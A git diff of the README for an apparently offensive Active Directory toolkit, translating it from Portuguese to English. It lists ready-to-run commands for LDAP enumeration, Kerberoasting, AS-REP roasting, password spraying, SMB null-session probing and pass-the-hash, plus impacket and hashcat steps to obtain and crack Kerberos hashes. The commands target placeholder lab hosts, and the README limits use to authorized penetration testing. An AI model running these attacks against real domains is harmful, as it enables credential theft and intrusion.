@@ -1,64 +1,76 @@
 # Ghost-AD
 
-**Active Directory Offensive Toolkit** - enumeracao LDAP, Kerberoasting, AS-REP Roasting, password spray, BloodHound-lite e hints de PTH/PTT.
+> Active Directory Attack Framework - LDAP enumeration, Kerberoasting, AS-REP Roasting, password spray, BloodHound-lite collection, PTH/PTT hints.
 
 ```
- ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗      █████╗ ██████╗
-██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝     ██╔══██╗██╔══██╗
-██║  ███╗███████║██║   ██║███████╗   ██║   ████╗███████║██║  ██║
-██║   ██║██╔══██║██║   ██║╚════██║   ██║        ██╔══██║██║  ██║
-╚██████╔╝██║  ██║╚██████╔╝███████║   ██║        ██║  ██║██████╔╝
- ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝        ╚═╝  ╚═╝╚═════╝
-
-  Active Directory Attack Framework  |  v1.0.0
-  By Gh0st-Bx1  |  github.com/Ghost-Bx1
+  GHOST-AD  v1.0.0  |  Active Directory Attack Framework
+  By Gh0st-Bx1      |  github.com/Ghost-Bx1
 ```
+
+![Python](https://img.shields.io/badge/Python-3.8%2B-blue?style=flat-square)
+![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows-lightgrey?style=flat-square)
+![Category](https://img.shields.io/badge/Category-Active%20Directory-red?style=flat-square)
 
 ---
 
-## Modulos
+## Overview
 
-| Subcomando   | Descricao                                              |
-|--------------|--------------------------------------------------------|
-| `ldap`       | Enumeracao completa via LDAP (usuarios, grupos, SPNs)  |
-| `kerb`       | Kerberoasting - lista contas com SPN para crack offline |
-| `asrep`      | AS-REP Roasting - contas sem pre-autenticacao Kerberos |
-| `spray`      | Password spraying com deteccao de lockout              |
-| `smb`        | Enumeracao SMB: null session + shares + signing check  |
-| `bloodhound` | Coleta BloodHound-lite - JSON de caminhos de ataque    |
-| `pth`        | Hints de Pass-the-Hash / Pass-the-Ticket               |
+Ghost-AD is a single-file Python 3 framework for Active Directory offensive operations. It covers the main attack paths from an initial foothold to privilege escalation, with graceful degradation when optional dependencies are absent.
+
+**Attack coverage:**
+
+| Module       | Technique                                             |
+|--------------|-------------------------------------------------------|
+| `ldap`       | LDAP enumeration - users, groups, SPNs, UAC flags     |
+| `kerb`       | Kerberoasting - list SPN accounts for offline cracking|
+| `asrep`      | AS-REP Roasting - accounts without Kerberos pre-auth  |
+| `spray`      | Password spraying with lockout detection              |
+| `smb`        | SMB enumeration - null session, shares, signing check |
+| `bloodhound` | BloodHound-lite JSON collection for path analysis     |
+| `pth`        | Pass-the-Hash / Pass-the-Ticket command hints         |
 
 ---
 
-## Instalacao
+## Requirements
+
+```
+Python 3.8+
+ldap3       (required for: ldap, kerb, asrep, bloodhound)
+impacket    (required for: spray, smb - degrades to hints without it)
+colorama    (optional, Windows color support)
+```
+
+```bash
+pip install ldap3 impacket
+```
+
+Without `ldap3`: LDAP modules fall back to port probing only.  
+Without `impacket`: spray and smb print equivalent crackmapexec / smbclient commands.
+
+---
+
+## Installation
 
 ```bash
 git clone https://github.com/Ghost-Bx1/ghost-ad
 cd ghost-ad
-pip install ldap3
-```
-
-> `impacket` e opcional - modulos `spray` e `smb` degradam graciosamente
-> e exibem os comandos equivalentes com `crackmapexec` / `smbclient`.
-
-```bash
-pip install impacket   # opcional, para spray/smb direto
+pip install ldap3 impacket
 ```
 
 ---
 
-## Uso
+## Usage
 
-### Enumeracao LDAP
+### LDAP Enumeration
 
 ```bash
-# Sessao autenticada
+# Authenticated session
 python ghost-ad.py ldap --dc 192.168.1.10 --domain corp.local -u jdoe -p 'P@ssw0rd'
 
-# Sessao anonima (bind anonimo)
+# Anonymous bind (no credentials)
 python ghost-ad.py ldap --dc 192.168.1.10 --domain corp.local
 
-# Salvar resultados em JSON
+# Save output to JSON
 python ghost-ad.py ldap --dc 192.168.1.10 --domain corp.local -u jdoe -p 'P@ssw0rd' --output ldap.json
 ```
 
@@ -68,7 +80,7 @@ python ghost-ad.py ldap --dc 192.168.1.10 --domain corp.local -u jdoe -p 'P@ssw0
 python ghost-ad.py kerb --dc 192.168.1.10 --domain corp.local -u jdoe -p 'P@ssw0rd'
 ```
 
-Contas com SPN encontradas: use impacket para solicitar TGS e crackear offline:
+Follow-up with impacket to request TGS and crack offline:
 
 ```bash
 impacket-GetUserSPNs corp.local/jdoe:'P@ssw0rd' -dc-ip 192.168.1.10 -request -outputfile kerb.hashes
@@ -78,14 +90,14 @@ hashcat -m 13100 kerb.hashes wordlist.txt
 ### AS-REP Roasting
 
 ```bash
-# Busca anonima no LDAP (sem credenciais)
+# Anonymous LDAP query
 python ghost-ad.py asrep --dc 192.168.1.10 --domain corp.local
 
-# Com lista de usuarios para verificacao cruzada
+# Cross-reference against a user list
 python ghost-ad.py asrep --dc 192.168.1.10 --domain corp.local --users-file users.txt
 ```
 
-Usuarios vulneraveis encontrados: solicitar AS-REP hash via impacket:
+Request AS-REP hashes via impacket:
 
 ```bash
 impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip 192.168.1.10 -format hashcat -outputfile asrep.hashes
@@ -97,34 +109,31 @@ hashcat -m 18200 asrep.hashes wordlist.txt
 ```bash
 python ghost-ad.py spray --dc 192.168.1.10 --domain corp.local \
     --users-file users.txt -p 'Winter2025!' --lockout 3 --delay 1.5
-
-# Delay maior para ambientes com GPO de lockout agressiva
-python ghost-ad.py spray --dc 192.168.1.10 --domain corp.local \
-    --users-file users.txt -p 'Company2025' --lockout 5 --delay 5.0
 ```
 
-> Sempre verifique o threshold de lockout da politica de senha antes de spray.
+Always verify the domain lockout threshold before spraying.
 
 ### SMB Enumeration
 
 ```bash
+# Null session probe
 python ghost-ad.py smb --dc 192.168.1.10
 
-# Com credenciais
+# Authenticated
 python ghost-ad.py smb --dc 192.168.1.10 --domain corp.local -u jdoe -p 'P@ssw0rd'
 ```
 
-### BloodHound-lite (coleta JSON)
+### BloodHound-lite
 
 ```bash
 python ghost-ad.py bloodhound --dc 192.168.1.10 --domain corp.local \
     -u jdoe -p 'P@ssw0rd' --output bh_corp.json
 ```
 
-O JSON gerado contem: usuarios, grupos, SPNs, contas AS-REP e adminCount.
-Importe no BloodHound CE para analise de caminhos de escalada.
+Output JSON contains: users, groups, SPNs, AS-REP accounts, adminCount.  
+Import into BloodHound CE for attack path analysis.
 
-### Pass-the-Hash / Pass-the-Ticket (hints)
+### Pass-the-Hash / Pass-the-Ticket
 
 ```bash
 python ghost-ad.py pth --dc 192.168.1.10 --domain corp.local \
@@ -133,76 +142,61 @@ python ghost-ad.py pth --dc 192.168.1.10 --domain corp.local \
 
 ---
 
-## Flags globais
+## Reference
 
-| Flag               | Descricao                              |
-|--------------------|----------------------------------------|
-| `-v / --verbose`   | Output detalhado                       |
-| `--output <file>`  | Salva resultado em JSON                |
-| `--no-banner`      | Suprime o banner ao iniciar            |
-| `--proxy <url>`    | Proxy HTTP/HTTPS (ex: http://127.0.0.1:8080) |
+### Global flags
 
----
+| Flag              | Description                                      |
+|-------------------|--------------------------------------------------|
+| `-v / --verbose`  | Verbose output                                   |
+| `--output <file>` | Save results to JSON                             |
+| `--no-banner`     | Suppress the startup banner                      |
+| `--proxy <url>`   | HTTP/HTTPS proxy (e.g. http://127.0.0.1:8080)   |
 
-## Flags por modulo
+### Per-module flags
 
-### ldap / kerb / smb / bloodhound
+**ldap / kerb / smb / bloodhound**
 
-| Flag             | Descricao                                   |
-|------------------|---------------------------------------------|
-| `--dc <ip>`      | IP ou hostname do Domain Controller (obrig.)|
-| `--domain <dom>` | Dominio AD, ex: corp.local (obrig.)         |
-| `-u / --user`    | Usuario para autenticacao (opcional)        |
-| `-p / --password`| Senha do usuario                            |
+| Flag              | Description                                      |
+|-------------------|--------------------------------------------------|
+| `--dc <ip>`       | Domain Controller IP or hostname (required)      |
+| `--domain <dom>`  | AD domain, e.g. corp.local (required)            |
+| `-u / --user`     | Authenticating user (optional)                   |
+| `-p / --password` | User password                                    |
 
-### asrep
+**asrep**
 
-| Flag              | Descricao                                  |
-|-------------------|--------------------------------------------|
-| `--dc <ip>`       | IP do Domain Controller                    |
-| `--domain <dom>`  | Dominio AD                                 |
-| `--users-file`    | Lista de usuarios para verificacao cruzada |
+| Flag             | Description                                       |
+|------------------|---------------------------------------------------|
+| `--dc <ip>`      | Domain Controller IP                              |
+| `--domain <dom>` | AD domain                                         |
+| `--users-file`   | User list for cross-reference (optional)          |
 
-### spray
+**spray**
 
-| Flag              | Descricao                                         |
-|-------------------|---------------------------------------------------|
-| `--dc <ip>`       | IP do Domain Controller                           |
-| `--domain <dom>`  | Dominio AD                                        |
-| `--users-file`    | Arquivo com lista de usuarios (um por linha)      |
-| `-p / --password` | Senha a testar em todos os usuarios               |
-| `--lockout <n>`   | Threshold estimado de lockout (padrao: 3)         |
-| `--delay <s>`     | Delay entre tentativas em segundos (padrao: 1.0)  |
+| Flag              | Description                                      |
+|-------------------|--------------------------------------------------|
+| `--dc <ip>`       | Domain Controller IP                             |
+| `--domain <dom>`  | AD domain                                        |
+| `--users-file`    | File with one username per line (required)       |
+| `-p / --password` | Password to test against all users              |
+| `--lockout <n>`   | Estimated lockout threshold (default: 3)         |
+| `--delay <s>`     | Delay in seconds between attempts (default: 1.0) |
 
-### pth
+**pth**
 
-| Flag          | Descricao                          |
-|---------------|------------------------------------|
-| `--dc <ip>`   | IP do Domain Controller            |
-| `--domain`    | Dominio AD                         |
-| `-u / --user` | Usuario alvo (padrao: administrator)|
-| `--hash`      | Hash NTLM (LM:NT ou apenas :NT)    |
-
----
-
-## Dependencias
-
-| Biblioteca  | Necessaria para              | Instalacao            |
-|-------------|------------------------------|-----------------------|
-| `ldap3`     | ldap, kerb, asrep, bloodhound| `pip install ldap3`   |
-| `impacket`  | spray (direto), smb          | `pip install impacket`|
-| `colorama`  | cores no Windows             | `pip install colorama`|
-
-Sem `ldap3` os modulos LDAP caem para sondagem de porta apenas.
-Sem `impacket` spray e smb exibem comandos equivalentes para execucao manual.
+| Flag          | Description                               |
+|---------------|-------------------------------------------|
+| `--dc <ip>`   | Domain Controller IP                      |
+| `--domain`    | AD domain                                 |
+| `-u / --user` | Target user (default: administrator)      |
+| `--hash`      | NTLM hash - LM:NT or :NT format           |
 
 ---
 
 ## Disclaimer
 
-> **Para uso exclusivo em ambientes autorizados.** Testes de penetracao, CTF e
-> pesquisa de seguranca ofensiva com permissao explicita do dono do ambiente.
-> O autor nao se responsabiliza pelo uso indevido desta ferramenta.
+For use in authorized environments only. Penetration testing, CTF competitions, and offensive security research with explicit permission from the environment owner. The author is not responsible for misuse.
 
 ---
 
